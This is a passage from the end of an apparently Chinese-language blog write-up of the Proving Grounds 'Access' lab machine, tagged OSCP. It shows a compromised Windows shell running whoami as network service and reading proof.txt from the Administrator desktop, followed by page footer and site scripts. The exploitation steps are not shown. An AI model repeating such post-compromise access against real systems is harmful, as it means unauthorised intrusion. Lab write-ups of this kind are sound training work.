+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\n</span>etwork service
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nb">cd</span> C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>
+</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type proof.txt
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> proof.txt
+</span></span><span class="line"><span class="cl">d0be636ebf08cd4c91a276012f25a135</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png" alt="image-20240112024650736" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png?size=large 2x" data-title="image-20240112024650736" style="--width: 3346px;--aspect-ratio: 3346 / 1254;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2024-01-12 06:17:36">更新于 2024-01-12&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/provinggrouds_surf_writeup/" class="post-nav-item" rel="prev" title="ProvingGrouds Surf WriteUp"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrouds Surf WriteUp</a><a href="/posts/provinggrounds-heist/" class="post-nav-item" rel="next" title="ProvingGrounds Heist Writeup">ProvingGrounds Heist Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
